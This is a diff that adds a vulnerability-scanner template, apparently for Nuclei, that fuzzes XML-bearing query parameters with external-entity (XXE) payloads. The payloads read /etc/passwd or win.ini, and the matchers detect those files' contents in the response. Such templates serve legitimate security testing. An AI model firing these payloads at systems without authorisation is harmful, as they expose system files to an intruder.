@@ -1,0 +1,50 @@
+id: fuzz-xxe
+
+info:
+  name: XXE Fuzzing
+  author: pwnhxl
+  severity: medium
+  reference:
+    - https://github.com/andresriancho/w3af/blob/master/w3af/plugins/audit/xxe.py
+  tags: dast,xxe,fuzz
+
+variables:
+  rletter: "{{rand_base(6,'abc')}}"
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+
+    payloads:
+      xxe:
+        - '<!DOCTYPE {{rletter}} [ <!ENTITY {{rletter}} SYSTEM "file:///c:/windows/win.ini"> ]><x>&{{rletter}};</x>'
+        - '<!DOCTYPE {{rletter}} [ <!ENTITY {{rletter}} SYSTEM "file:////etc/passwd"> ]><x>&{{rletter}};</x>'
+
+    fuzzing:
+      - part: query
+        keys-regex:
+          - "(.*?)xml(.*?)"
+        fuzz:
+          - "{{xxe}}"
+
+      - part: query
+        values:
+          - "(<!DOCTYPE|<?xml|%3C!DOCTYPE|%3C%3Fxml)(.*?)>"
+        fuzz:
+          - "{{xxe}}"
+
+    stop-at-first-match: true
+    matchers-condition: or
+    matchers:
+      - type: regex
+        name: linux
+        part: body
+        regex:
+          - 'root:.*?:[0-9]*:[0-9]*:'
+
+      - type: word
+        name: windows
+        part: body
+        words:
+          - 'for 16-bit app support'
